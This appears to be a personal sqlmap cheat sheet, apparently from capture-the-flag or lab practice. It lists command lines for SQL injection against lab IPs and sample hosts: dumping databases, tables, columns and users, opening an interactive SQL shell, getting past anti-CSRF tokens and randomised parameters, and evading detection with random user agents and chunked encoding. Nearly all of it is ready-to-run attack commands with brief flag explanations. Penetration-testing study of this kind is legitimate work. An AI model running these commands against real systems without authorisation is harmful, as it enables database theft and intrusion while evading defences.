--dump is used to extract every information.

Enumerating database
---------------------
sqlmap -u "http://10.10.231.6/register/user-check?username=admin" --dump
sqlmap -u "http://10.10.231.6/register/user-check?username=admin" --dbs
sqlmap -r req.txt --current-db (current database)
_____________________________________________________________________________________________________________________________________________________________________________________
Enumerating users
------------------
sqlmap -r req.txt --current-user (current user)
_____________________________________________________________________________________________________________________________________________________________________________________

Enumerating all tables
-----------------------

GET method ( doen't need request file or --method )
----------
sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables

POST method (need request file or --method POST)
----------
sqlmap -r req.txt -D <database_name> --tables
___________________________________________________________________________________________________________________________________________________________________________________

Enumerating columns 
--------------------

sqlmap -r req.txt -D <database_name> -T <table_name> --columns
_____________________________________________________________________________________________________________________________________________________________________________________

sqlmap -u "http://example.com/login" --data "username=test&password=test" --method POST -p username --sql-shell

sqlmap -u "http://example.com/login" --data "username=test&password=test" --method POST -p username --dbs

--dbs used to enumerate databases and --dbms is used to specify the database.
--sql-shell = gives you interactive sql shell to code sql queries manually
--data = add data in post method
-p username = using username parameter
_____________________________________________________________________________________________________________________________________________________________________________________

Difference between
-------------------
#sqlmap -r req.txt -D blood -T flag --dump (more accurate)
#sqlmap -r req.txt -D blood -T flag -C name --dump
_____________________________________________________________________________________________________________________________________________________________________________________

Enumerating with cookies
-------------------------
#sqlmap -u "http://10.3.4.55/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=;" –-dbs <br>
#sqlmap -u "http://www.moviescope.com/viewprofile.aspx?id=1" --cookie="mscope=1jwuydl=; ui-tabs-1=0" 
______________________________________________________________________________________________________________________________________________________________________

# If User Request doesn't have input , just use JSON input (e.g {"id":1}
<img width="1440" height="549" alt="image" src="https://github.com/user-attachments/assets/33ab530c-c390-41ad-bb25-2b574076e90d" />
<br>


# Anti-CSRF token Bypass

req.txt file

<img width="675" height="447" alt="image" src="https://github.com/user-attachments/assets/80833c48-a882-4945-b957-65360f884813" />


#sqlmap -r req.txt --csrf-token="t0ken" --batch --dump

# Unique parameter Bypass

Each parameter is combined with unique parameter for protection, to bypass the unique parameter just the value called --randomize 

#sqlmap -u "http://154.57.164.79:31524/case9.php?id=1&uid=26987434" --randomize=uid --batch --dump

# Using --random-agent in sqlmap

#sqlmap -r req.txt -p email --level 5  --risk 3 --random-agent --chunked --dump

--random-agent: This option tells sqlmap to use a randomly selected HTTP User-Agent header for each request, which can help evade detection.

--chunked: This option instructs sqlmap to use chunked encoding in HTTP requests. Chunked encoding can help bypass some security measures.


